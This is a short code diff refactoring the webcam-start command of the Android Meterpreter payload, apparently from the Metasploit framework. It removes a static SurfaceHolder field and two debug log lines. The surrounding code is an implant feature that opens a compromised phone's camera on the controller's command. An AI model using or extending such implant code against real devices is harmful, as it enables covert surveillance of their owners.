@@ -27,10 +27,8 @@ public class webcam_start_android extends webcam_audio_record implements Command
     private static final int TLV_TYPE_WEBCAM_INTERFACE_ID = TLVPacket.TLV_META_TYPE_UINT | (TLV_EXTENSIONS + 2);
 
     public static Camera camera;
-    public static SurfaceHolder surfaceHolder;
 
     public int execute(Meterpreter meterpreter, TLVPacket request, TLVPacket response) throws Exception {
-
         int camId = request.getIntValue(TLV_TYPE_WEBCAM_INTERFACE_ID);
 
         try {
@@ -49,11 +47,10 @@ public class webcam_start_android extends webcam_audio_record implements Command
                 @Override
                 public void run() {
                     SurfaceView surfaceView = new SurfaceView(context);
-                    surfaceHolder = surfaceView.getHolder();
+                    SurfaceHolder surfaceHolder = surfaceView.getHolder();
                     surfaceHolder.addCallback(new SurfaceHolder.Callback() {
                         @Override
                         public void surfaceCreated(SurfaceHolder holder) {
-                            Log.e(getClass().getSimpleName(), "surfaceCreated");
                             try {
                                 camera.setPreviewDisplay(holder);
                             } catch (IOException e) {
@@ -62,7 +59,6 @@ public class webcam_start_android extends webcam_audio_record implements Command
 
                         @Override
                         public void surfaceChanged(SurfaceHolder holder, int format, int width, int height) {
-                            Log.e(getClass().getSimpleName(), "surfaceChanged");
                             if (camera == null) {
                                 return;
                             }
